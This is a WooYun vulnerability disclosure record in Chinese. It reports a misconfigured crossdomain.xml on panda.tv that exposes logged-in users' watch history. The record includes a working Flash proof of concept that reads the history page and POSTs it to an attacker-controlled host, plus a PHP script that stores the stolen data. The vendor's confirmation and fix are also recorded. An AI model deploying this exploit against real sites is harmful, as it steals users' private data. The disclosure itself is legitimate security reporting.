{"id": 76868, "wybug_id": "wooyun-2015-0163799", "wybug_title": "点我链接我就知道你在熊猫TV上看过什么", "wybug_corp": "熊猫互娱文化有限公司", "wybug_author": "路人甲", "wybug_date": "2015-12-23 11:57", "wybug_open_date": "2016-02-06 10:45", "wybug_type": "应用配置错误", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["配置错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-06：\t细节向公众公开  简要描述：  详细说明：  http://www.panda.tv/crossdomain.xml 配置不当csrf 可获取敏感信息,通过http://www.panda.tv/watchhistory获取历史记录同时也可获取其他信息PoC:\n// Author: Gursev Singh Kalra (gursev.kalra@foundstone.com)// XDomainXploit.as// Thanks - http://help.adobe.com/en_US/as3/dev/WS5b3ccc516d4fbf351e63e3d118a9b90204-7cfd.html#WS5b3ccc516d4fbf351e63e3d118a9b90204-7cf5package {\timport flash.display.Sprite;\timport flash.events.*;\timport flash.net.URLRequestMethod;\timport flash.net.URLRequest;\timport flash.net.URLLoader;\tpublic class XDomainXploit extends Sprite {\t\tpublic function XDomainXploit() {\t\t\t// Target URL from where the data is to be retrieved\t\t\tvar readFrom:String = \"http://www.panda.tv/watchhistory\";\t\t\tvar readRequest:URLRequest = new URLRequest(readFrom);\t\t\tvar getLoader:URLLoader = new URLLoader();\t\t\tgetLoader.addEventListener(Event.COMPLETE, eventHandler);\t\t\ttry {\t\t\t\tgetLoader.load(readRequest);\t\t\t} catch (error:Error) {\t\t\t\ttrace(\"Error loading URL: \" + error);\t\t\t}\t\t}\t\tprivate function eventHandler(event:Event):void {\t\t\t// URL to which retrieved data is to be sent\t\t\tvar sendTo:String = \"http://xxxxxx/baike.php\"\t\t\tvar sendRequest:URLRequest = new URLRequest(sendTo);\t\t\tsendRequest.method = URLRequestMethod.POST;\t\t\tsendRequest.data = event.target.data;\t\t\tvar sendLoader:URLLoader = new URLLoader();\t\t\ttry {\t\t\t\tsendLoader.load(sendRequest);\t\t\t} catch (error:Error) {\t\t\t\ttrace(\"Error loading URL: \" + error);\t\t\t}\t\t}\t}}\nbaike.php\n<?php$data = file_get_contents(\"php://input\");$ret = file_put_contents('/tmp/panda.html', $data, FILE_APPEND | LOCK_EX);if($ret === false) { die('Error writing to file');}else {  echo \"$ret bytes written to file\";}?>\n   漏洞证明：  访问http://xxx.xxx.xxx.xxx/XDomainXploit.swf\n\n\n\n   修复方案：  crossdomain.xml安全配置   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2015-12-24 14:52 厂商回复： 熊猫君已经改进了此问题，感谢白帽子大大的支持！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}